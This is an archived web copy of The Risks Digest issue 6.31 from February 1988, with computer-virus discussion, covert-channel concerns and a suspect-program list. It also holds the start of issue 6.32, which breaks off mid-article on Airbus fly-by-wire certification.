<A HREF="/Risks/6.29.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.31.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-67</DOCNO>
<DOCOLDNO>IA012-000130-B024-328</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.31.html 128.240.150.127 19970217015734 text/html 23019
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:55:59 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 31</TITLE>
<LINK REL="Prev" HREF="/Risks/6.30.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.32.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.30.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.32.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 31</H1>
<H2> Wednesday 24 February 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Risks of Advertising Messages Appended to Telex Messages 
</A>
<DD>
<A HREF="#subj1.1">
Bruce N. Baker
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  "Viruses?  Don't Worry!" 
</A>
<DD>
<A HREF="#subj2.1">
Joseph M. Beckman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Held at Mouse-Point; Virus-Information Centres 
</A>
<DD>
<A HREF="#subj3.1">
Dave Horsfall
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Computer Viruses -- a catalog 
</A>
<DD>
<A HREF="#subj4.1">
Dave Curry
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Another RISK of viruses 
</A>
<DD>
<A HREF="#subj5.1">
David Purdue
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Virus security hole 
</A>
<DD>
<A HREF="#subj6.1">
Kevin Driscoll
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: More info on Compuserve Macinvirus 
</A>
<DD>
<A HREF="#subj7.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Code-altering viruses 
</A>
<DD>
<A HREF="#subj8.1">
William Smith
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Self Fulfilling Prophecies, the Chaos Computer Club,... 
</A>
<DD>
<A HREF="#subj9.1">
Frederick Korz
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Viruses and secure systems 
</A>
<DD>
<A HREF="#subj10.1">
Kian-Tat Lim
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Risks of Advertising Messages Appended to Telex Messages
</A>
</H3>
<address>
Bruce N. Baker 
&lt;<A HREF="mailto:BNBaker@KL.SRI.COM">
BNBaker@KL.SRI.COM
</A>&gt;
</address>
<i>
Wed 24 Feb 88 10:39:50-PST
</i><PRE>

I recently sent a TELEX message to Copenhagen.  The recipient responded by
writing on the message he received from me and returning it by normal post.
I thus found that the TELEX carrier had appended text to my original message,
which struck me as unprofessional and unethical.  The appended text reads:

     FOR 1988 HOROSCOPE FORECASTS
     CALL USA 62200 CODE 9150

Has anyone else noticed any such appendages to TELEX messages?  (If you also
find out my horoscope for Sagittarius, please let me know what the stars
portend for me.)
                                           Bruce N. Baker, SRI International

   [Hmm.  Sagittarius is depicted as a centaur (HALF-HORSE) shooting an arrow.
   The question is whether this was a Trojan half-horse (since it attached a
   second half to the message -- BUT POSSIBLY EVEN CHANGING THE FIRST HALF?) 
   or a sleazy advertising campaign on the part of TELEX...  Well, buses and
   taxis routinely carry advertising.  TELEXes cannot be too far behind!  
   Or perhaps this is like the Wells Fargo case of <A HREF="/Risks/6.27.html">RISKS-6.27</A>?  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
 "Viruses?  Don't Worry!" (!!)
</A>
</H3>
<address>
"Joseph M. Beckman" 
&lt;<A HREF="mailto:Beckman@DOCKMASTER.ARPA">
Beckman@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Wed, 24 Feb 88 13:09 EST
</i><PRE>

Some excerpts from T.R. Reid's "Personal Computing" column in the 15 Feb
1988 Washington Post:

  "...such programs [computer viruses] are rarely a threat in the personal
  computer world.  And they are fairly easy to defend against."

  "...These cases [NASA, IBM xmas tree] involved networks of work stations
  or even bigger computers.  That's the first key point to recognize about
  the computer virus reports--they don't involve personal computers."

  "If you never "feed" your machine anything but programs from established
  software houses, your machine will be immune."

  "If you like to call up bulletin boards to download programs...there is
  a chance that your hard disk could be infected by a virus program.  The
  possibility is so unlikely that you really needn't worry much."

  "In sum, my answer to personal computer users concerned about computer
  virus is:  Don't Worry."

Rebuttal of the points mentioned is left to the humor of the reader.  Joseph

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Held at Mouse-Point; Virus-Information Centres
</A>
</H3>
<address>
Dave Horsfall
&lt;<A HREF="mailto:munnari!stcns3.stc.oz.au!dave@uunet.UU.NET ">
munnari!stcns3.stc.oz.au!dave@uunet.UU.NET 
</A>&gt;
</address>
<i>
Mon, 22 Feb 88 14:20:59 est
</i><PRE>

Here are two contributions from "Computing Australia", 1st Feb 1988.

1) From the back page (the "laugh" page):

``From the 'If he had another brain it would be lonely' department.

  A US auditing firm was training a group of taxation accountants in the
  use of a Macintosh word processor.  The demonstrator directed his students
  to "Point and click with the mouse."  One student raised his hand and
  announced nothing was happening.  On checking, the instructor found he was
  clicking the mouse button and pointing at a screen icon -- with his
  forefinger!  No doubt the student's progess report would have carried
  the notation that he was a dis-a-pointer.''

The RISK?  Sometimes, instructions are interpreted literally...  Although
I can imagine the semantic confusion that could arise should a mouse ever
be teamed up with a touch-sensitive screen!


2) Elsewhere in the same issue (a "serious" page):

``Virus centre too risky: Canberra.

  "Great risks" would arise from the setting up of a national information
  security research centre to fight software viruses, according to
  Technology Minister Senator John Button's Canberra spokesman.  Queensland's
  computer security expert Dr Bill Caelli has called for government funding
  for such a centre.  He said the proposed centre could develop tools to
  analyse software packages to ensure they were virus-free and did no more
  than they were supposed to.

  Button's spokesman said "In general, the Government's attitude is `Let the
  user beware'.  We don't want to reject all calls out of hand but are not
  planning any further regulation.  There could be great risks: if the centre
  or its tools validated a program and it turned out to have a bug [virus?],
  it could face litigation.''

That last bit worries me - we can't even verify programs at the SOURCE level,
so, short of brute-force emulation, what hope have we got at verifying them
at the machine-code level?

Dave Horsfall (VK2KFU)      ACS:  dave@stcns3.stc.OZ.AU
Alcatel-STC Australia       ARPA: dave%stcns3.stc.OZ.AU@uunet.UU.NET
11th Floor, 5 Blue St       UUCP: {enea,hplabs,mcvax,uunet,ukc}!\
North Sydney NSW 2060 AUSTRALIA    munnari!stcns3.stc.OZ.AU!dave

             [There are unconfirmed reports that some of the "virus-killer"
             programs themselves contain Trojan horses.  CAVEAT EMPTOR.  PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Computer Viruses -- a catalog
</A>
</H3>
<address>
Dave Curry
&lt;<A HREF="mailto:davy@intrepid.ecn.purdue.edu ">
davy@intrepid.ecn.purdue.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: Tue, 23 Feb 88 11:03:48 EST

Information Week, 2/22/88 has an article about computer viruses and another
about computer security.  Both of the articles are pretty worthless, being
full of sensationalist statements and very little fact.  But, they did put
the following in:

   PC expert Eric Newhouse lists known contaminated programs that should be
   avoided on public bulletin boards.  If you have a copy of one of these
   programs, consider it suspect even though some run fine.  When no extension
   is listed, the program has appeared with many extensions.

	Arc			List60
	Arc513.			QMDM110.Exe
	Arc600			QMDM110A.Arc
	Balktalk		Quikbbs.Com
	Discscan.Exe		Secret.Bas
	Dosknows.Exe		Stripes.Exe
	Egabtr			Vdir.Com
	Filer.Exe

(The rather weird capitalization scheme is theirs, not mine.)
Dave Curry, Purdue University

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Another RISK of viruses
</A>
</H3>
<address>
David Purdue
&lt;<A HREF="mailto:munnari!csadfa.oz.au!davidp@uunet.UU.NET ">
munnari!csadfa.oz.au!davidp@uunet.UU.NET 
</A>&gt;
</address>
<i>
Fri, 19 Feb 88 16:02:11 est
</i><PRE>

A club based in Canberra offerred someone $100 to write a program for the
Amiga that would do some timetabling for a conference that the club holds
annually.  When the conference rolled around, the program was not ready
and the timetabling was done by hand, and there were many mistakes made.

A meeting was held recently, some three weeks after the conference. At this
meeting the programmer pointed out that although he didn't have a working
product, he had done a lot of work for the club, and asked for his $100.
He was asked why the program wasn't ready in time.  He replied, "It's not
my fault.  The program was hit by a virus which scrubbed my disk, and I
didn't have a backup."

The Risk?  Well, it may be true that a virus scrubbed his disk; but there
was no mention of it until the meeting.  With the proliferation of viruses,
and the big fuss that the media are making of them (that includes computing
industry newspapers, the major press and discussions on the net), it seems
to me that programmers now have a real handy excuse for not meeting their
commitments.
						DavidP

Mr. David Purdue           Phone ISD: +61 62 68 8165    Fax: +61 62 470702
Dept. Computer Science         Telex: ADFADM AA62030
University College      ACSNET/CSNET: davidp@csadfa.oz
Aust. Defence Force Academy     ARPA: davidp%csadfa.oz@uunet.uu.net
Canberra. ACT. 2600.           JANET: davidp@oz.csadfa
AUSTRALIA             Other Gateways: see CACM 29(10) Oct. 1986
    UUCP: {uunet,hplabs,ubc-vision,nttlab,mcvax,ukc}!munnari!csadfa.oz!davidp

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Virus security hole
</A>
</H3>
<address>
Kevin Driscoll
&lt;<A HREF="mailto:umn-cs!altura.driscoll@rutgers.edu ">
umn-cs!altura.driscoll@rutgers.edu 
</A>&gt;
</address>
<i>
Mon, 22 Feb 88 10:48:30 CST
</i><PRE>

   In theory, Larry Nathan's example of exporting classified information from
a secure area should not be possible because all outgoing information from a
secure area is suspect and is sanitized.  However, human nature being what it
is, the outgoing scrutiny is probably not done as thoroughly as it should and
data can escape this way.  Another approach can subvert even the best outgoing
screening process.  This is the use of covert channels, sometimes called
"banging on the walls".
   The method is to use some communications channel that is not considered an
"output" from the secure area.  For example, the virus could cause a disk head
positioner to travel its maximum excursion at its maximum velocity, then
modulate the frequency of reversals according to the classified data to be
transmitted.  The data can be received by recording the vibrations caused by
the disk drive.  This method subverts most of the top secret TEMPEST secure
installations that I have seen.
   The common risk here is that security plans generally assume that the only
dangers are physical entry, TEMPEST leakage, or information leaving via the
area's normal output channels.  Completely ignored is the possibility of data
ENTERING the area as being a security threat.
   I have just recently reminded our system operators about the possible
dangers of a virus exploiting covert channels and the care that must be taken
to ensure that our UNsecure systems are not infected, which could be a threat
to our secure systems.  Of course, safe software practices should be when
sharing software among systems with differing classifications, even if the
systems are entirely in-house.
   A group here at Honeywell SRC is working on the thornier problem of
preventing such attacks on single multilevel secure systems (class A1+
trusted computer).

  Another virus subject that has been discussed, is the trustworthiness of
software held in archives on the net.  What should not be overlooked is that
even if a given archive can be trusted, the intervening path may not be.
Software can be infected en route.  Many of these routes pass through
universities, which can be the most hazardous software environment in the
world.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: More info on Compuserve Macinvirus [<A HREF="/Risks/6.27.html">RISKS-6.27</A>]
</A>
</H3>
<address>
&lt;<A HREF="mailto:mnetor!utzoo!henry@uunet.UU.NET">
mnetor!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Sat, 20 Feb 88 04:22:03 EST
</i><PRE>

&gt; '... People here in Canada and over in Europe see this for what
&gt; it is, a message of peace.  It's you people in the United States who see
&gt; it as something dark and nasty.' [Henry, are we really that paranoid down
&gt; here?]

The "message of peace" business is pure self-serving excrement.  (I may
possibly be biased here, since I have a low opinion of a lot of the lip
service given to "peace" nowadays.)  It's no better than a cute prank.
However, I'm not too impressed by the paranoids either.  (No, there is
no particular concentration of paranoids in particular nations that I'm
aware of.)  This actually goes back to the old question of whether it is
better to expose security problems or keep them secret.  One's attitude
on that issue determines whether one thinks the MacMag incident was a
harmless prank that may alert people to a real problem, or an evil act
that opens up horrible vistas.  Personally I side with the former point
of view:  this particular incident was childish but harmless -- note that
the people involved hired a professional programmer, whose duties presumably
included making *sure* that it was harmless -- and anyone who believes
that the Bad Guys hadn't thought of it already is dreaming.

The one risk I do see coming out of this is the possibility of it inspiring
others to implement and spread "harmless" viruses that may not be so well
built and may inadvertently cause damage.  But these are still rather
less likely to make trouble than the truly malicious ones, and maybe it
will help wake people up.

Henry Spencer @ U of Toronto Zoology {allegra,ihnp4,decvax,pyramid}!utzoo!henry

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Code-altering viruses (<A HREF="/Risks/6.29.html">RISKS-6.29</A>)
</A>
</H3>
<address>
William Smith
&lt;<A HREF="mailto:wsmith@m.cs.uiuc.edu ">
wsmith@m.cs.uiuc.edu 
</A>&gt;
</address>
<i>
Sat, 20 Feb 88 08:26:47 cst
</i><PRE>

&gt; ... the inevitability of viruses that target specific software products. ...

Although detecting such a virus would be difficult, once detected, recovery 
from the virus should not be difficult.  After making a copy of the
distribution software onto a hard disk or another floppy, the original
program disk or tape should never see the computer again (unless the copies 
are damaged or lost).  It is probably also a good idea for the original copy
never to be put into the computer write-enabled.

Once a damaged copy of a program is found, the online copies of it are 
deleted and replaced from a secure copy after the virus has been removed.  

The problem with most viruses is that their target is often the operating
system.  This first step, deleting the online copies is not possible because
the computer won't reboot after that.  That might point to a solution: The
computer needs an "immune system" that can be booted from, say a read-only
floppy or tape, and may then be used to safely replace any corrupted system or
user files from archive copies of the software.  Probably, since most
executables are not supposed to modified, the immune system simply could go
through each of the distribution disks and do a binary compare of each program
with the archive.  If a program has changed, it is replaced with a clean copy.
The primary feature of an immune system is that it never executes any external
non-ROM code so that it is impossible for it to be attacked by a trojan horse
(assuming the ROMs can be trusted).

Bill Smith    wsmith@a.cs.uiuc.edu   ihnp4!uiucdcs!wsmith

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Self Fulfilling Prophecies, the Chaos Computer Club, &amp; RISKS 6.27
</A>
</H3>
<address>
Frederick Korz 
&lt;<A HREF="mailto:korz@heathcliff.columbia.edu">
korz@heathcliff.columbia.edu
</A>&gt;
</address>
<i>
Sun, 21 Feb 88 18:49:12 EST
</i><PRE>

   Carl J. Lydick's contribution to RISKS volume 6.27 demonstrates the
potent power of rumors and allegations.  The Chaos Computer Club's
announcement that they were going to trigger their Trojan horses in the
Space Physics Analysis Network further illustrates the power of rumor
_backed by plausibility_.  They didn't have to do anything.  The sky didn't
have to fall.  Nervous managers did the damage for the C.C.C.  because they
felt the announcement/threat plausible.  The prophecy was fulfilled.

   A similar effect occurs in response to a rumor, even when the rumor's
threat is implausible or provably incorrect.  In the past, I was a naval
officer assigned to a submarine.  When you are at sea and the nearest
supermarket is hundreds of miles away, toilet paper becomes a precious
commodity.  The ship never left port without an adequate supply yet, if one
let it `be known' that we were `running out of toilet paper,' a two month
supply would be exhausted in two days!!! People would irrationally grab a roll
or two and hide it.  This is in spite of the fact that we (1) started with an
adequate supply and (2) a submarine is small enough to verify or invalidate
the rumor in less than one hour.  Rumor starting and quelling were both useful
skills.

   This behavior also appears frequently in western newspaper reports of
eastern European countries.  The rumor starts that there is going to be a
shortage of X, there is a run (well perhaps a line) on the markets for X, X
is sold out, and the prophecy is fulfilled.

   There are three levels of rumor - the impossible, the plausible but
improbable, and the possible and likely.  The first can be ignored.  The
second may be ignored after evaluating the risk inherent. The third requires
serious investment of time and effort in evaluating the risks and then further
resources to develop counter plans or contingency measures.  The malicious
rumor promulgated by the Chaos Computer Club was clearly of the third form.
Their announcement was, in short, a form of terrorism.

   I don't know what level of access the C.C.C. obtained to SPAN.  Perhaps the
system managers' fears were well founded and their actions were reasonable
reactions to the perceived threat.  I do know that the specter of security
(Trojan horses here) can be raised over their heads again and again until they
are so weary of it that they don't respond.  That would be a most debilitated
condition - all `care-ed' out.  To cope with the threat one hopes SPAN is in
the meantime analyzing the situation for alternate responses and cleansing
their systems.

Frederick M. Korz, Graduate Student, Columbia University, N.Y.C, N.Y.

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Viruses and secure systems (Re: <A HREF="/Risks/6.29.html">RISKS-6.29</A>) [Fiction anticipates fact]
</A>
</H3>
<address>
Kian-Tat Lim
&lt;<A HREF="mailto:elroy!lim%cit-vax.Caltech.Edu@ames.arc.nasa.gov ">
elroy!lim%cit-vax.Caltech.Edu@ames.arc.nasa.gov 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 20 Feb 88 07:52:53 GMT
Organization: California Institute of Technology

A very similar scenario (and the first time I ever saw viruses mentioned)
occurs in the science-fiction novel "The Adolescence of P-1" by an author
whose name I have forgotten.  Given some suspension of disbelief (unreasonably
good AI capabilities), an entertaining and thought-provoking farce about
computers and security.

-- Kian-Tat Lim (ktl@wagvax.caltech.edu, GEnie: K.LIM1)

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.30.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.32.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-68</DOCNO>
<DOCOLDNO>IA012-000130-B024-344</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.32.html 128.240.150.127 19970217015800 text/html 25463
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:56:14 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 32</TITLE>
<LINK REL="Prev" HREF="/Risks/6.31.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.33.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.31.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.33.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 32</H1>
<H2> Friday 26 February 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Back-Seat Driving Goes High Tech 
</A>
<DD>
<A HREF="#subj1.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Lottomatic computing 
</A>
<DD>
<A HREF="#subj2.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Billion Dollar Software for $900 ?? 
</A>
<DD>
<A HREF="#subj3.1">
Ken De Cruyenaere
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Airbus Fly-by-Wire Controversy 
</A>
<DD>
<A HREF="#subj4.1">
Nancy Leveson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  File matching 
</A>
<DD>
<A HREF="#subj5.1">
Barry Nelson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Mistaken Identity and Display of Retrieved Sets 
</A>
<DD>
<A HREF="#subj6.1">
James H. Coombs
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: Taxing information 
</A>
<DD>
<A HREF="#subj7.1">
Dick King
</A><br>
<A HREF="#subj7.2">
 Jeff MacKie-Mason
</A><br>
<A HREF="#subj7.3">
 jong
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: the risks of voice recognition in banking services 
</A>
<DD>
<A HREF="#subj8.1">
Jerry Kew
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  SDI S/W 
</A>
<DD>
<A HREF="#subj9.1">
Fred Baube
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Request for Viruses to be used to test AntiBiotics 
</A>
<DD>
<A HREF="#subj10.1">
Amir Herzberg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  Viruses and "The Adolescence of P-1" 
</A>
<DD>
<A HREF="#subj11.1">
Pat Reedy
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Back-Seat Driving Goes High Tech
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:NEUMANN@csl.sri.com">
NEUMANN@csl.sri.com
</A>&gt;
</address>
<i>
Fri 26 Feb 88 14:32:37-PST
</i><PRE>

A 1977 Dodge van with a computerized loud-mouth back-seat driver designed to
avoid collisions was demonstrated at the Governor's Regional Transportation
Management Conference.  Upon detecting a nearing collision to which the
driver does not respond, the system barks out simulated voice messages such
as "WATCH IT!  WATCH IT!  LOOK OUT!  LOOK OUT!" or "FALL BACK!  FALL BACK".
When the driver does nothing, the computer applies the brakes and slows the
vehicle smoothly.  "It was like driving with a loud, nervous and ill-tempered
co-driver."  The system is called "Lookout", and is made by Radar Control
Systems, Inc.  The computer is about the size of a cigaret pack.  (Source: A
front page article by Kevin Leary, with the above title, San Francisco
Chronicle, 26 Feb 88.)

From the RISKS point of view, this could be a scary development.  Inordinate
dependence on this technology by people who are not sensible in the first place
may tend to make matters worse.  Drivers who are drunk, stoned, or sleepy may
soon be taking to the roads with alacrity, possibly causing collisions among
cars that do not have the devices even if the drivers themselves were magically
protected.  Some drivers may keep a failed unit mounted, so that in case of a
collision, they could blame it on the computer.  A second-order concern is that
lawsuits against the manufacturer are likely in the event of accidents IN SPITE
OF the device (e.g., if it was turned off).  (Yes, lawsuits BECAUSE OF the
device might also be expected -- e.g., if simultaneous approaches from two
sides caused signals to cancel each other, due to a design flaw.)  Thus, we
need to check out rather carefully the social and other implications of this
technology.  Blind trust in such a technology may be more dangerous than the
risks of the technology themselves...  PGN

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Lottomatic computing 
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:NEUMANN@csl.sri.com">
NEUMANN@csl.sri.com
</A>&gt;
</address>
<i>
Fri 26 Feb 88 14:40:02-PST
</i><PRE>

GTECH Corp, which operates California's on-line real-time lotto control
system, has been fined more than $730,000 because of various computer
system failures that have prevented bets from being placed.  GTECH blamed
"an overly complex system design that has proved to be too much for the
lottery's central computers.'  (San Francisco Chronicle, 26 Feb 88, p. 2)

  [Here is a need for nonstop, reliable, secure, high-integrity computing.  
  I wonder whether the system designers really anticipated the requirements 
  properly, and whether GTECH anticipated the risk of such a fine!  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Billion Dollar Software for $900 ??
</A>
</H3>
<address>
&lt;<A HREF="mailto:Ken  De Cruyenaere <KDC%UOFMCC.BITNET@CUNYVM.CUNY.EDU> 204-474-8340">
Ken  De Cruyenaere &lt;KDC%UOFMCC.BITNET@CUNYVM.CUNY.EDU&gt; 204-474-8340
</A>&gt;
</address>
<i>
Thu, 25 Feb 88 09:30 CST
</i><PRE>

From the Feb. 23 issue of the Winnipeg Sun (reprinted without permission):

COMPUTER PURCHASE OFFERS A BLUEPRINT FOR SUCCESS

Toronto (CP) A man who bought computer equipment for $900 at auction last
September is being sued by a Canadian subsidiary of a U.S. telecommunications
giant, which says software included in the sale is worth billions of dollars.
The story could prove embarrassing to the Ontario government.  One of its
agencies, the Ontario Development Corporation, turned over to a receiver
valuable material.  Norbert Stoeckl, president of the Scarborough Bone
Analysis Clinic, purchased the source code and manuals for the UNIX operating
system at an auction by Danbury Sales Ltd.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Airbus Fly-by-Wire Controversy
</A>
</H3>
<address>
Nancy Leveson 
&lt;<A HREF="mailto:nancy%murphy.ics.uci.edu@ROME.ICS.UCI.EDU">
nancy%murphy.ics.uci.edu@ROME.ICS.UCI.EDU
</A>&gt;
</address>
<i>
Tue, 23 Feb 88 18:43:54 -0800
</i><PRE>
Reply-To: nancy@ics.UCI.EDU

There is currently some controversy over the certification of the Airbus
320 in England.  In case you are unfamiliar with this aircraft, it is
to be the first truly fly-by-wire civilian aircraft.  Much of the argument
that I have read that Airbus uses to support the claim that the software 
is highly reliable is based on the fact that they use n-version programming.  

The London Sunday Times of December 13 contained the following article:

   "A math professor is preparing to go to court in an attempt to prevent the
   world's most advanced civilian aircraft coming into service because he
